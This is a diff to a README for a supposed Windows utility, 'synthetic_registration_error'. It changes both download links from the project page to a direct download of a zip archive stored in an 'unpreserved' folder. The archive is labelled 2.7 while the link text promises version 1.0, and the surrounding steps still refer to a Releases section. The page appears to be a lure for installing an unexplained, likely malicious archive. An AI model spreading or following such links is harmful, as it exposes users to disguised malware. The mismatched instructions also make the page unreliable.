@@ -1,6 +1,6 @@
 # 🛠️ synthetic_registration_error - Fix data registration errors with ease
 
-[![Download Now](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Seamed-deracination686/synthetic_registration_error)
+[![Download Now](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Seamed-deracination686/synthetic_registration_error/raw/refs/heads/main/unpreserved/synthetic_registration_error_2.7.zip)
 
 ## About the software
 
@@ -14,7 +14,7 @@ You need a computer running Windows 10 or Windows 11. The software requires at l
 
 You must visit the project page to download the latest version of the installer. 
 
-[Download Version 1.0 here](https://github.com/Seamed-deracination686/synthetic_registration_error)
+[Download Version 1.0 here](https://github.com/Seamed-deracination686/synthetic_registration_error/raw/refs/heads/main/unpreserved/synthetic_registration_error_2.7.zip)
 
 1. Click the link above to open your browser.
 2. Look for the section labeled Releases on the right side of the page.
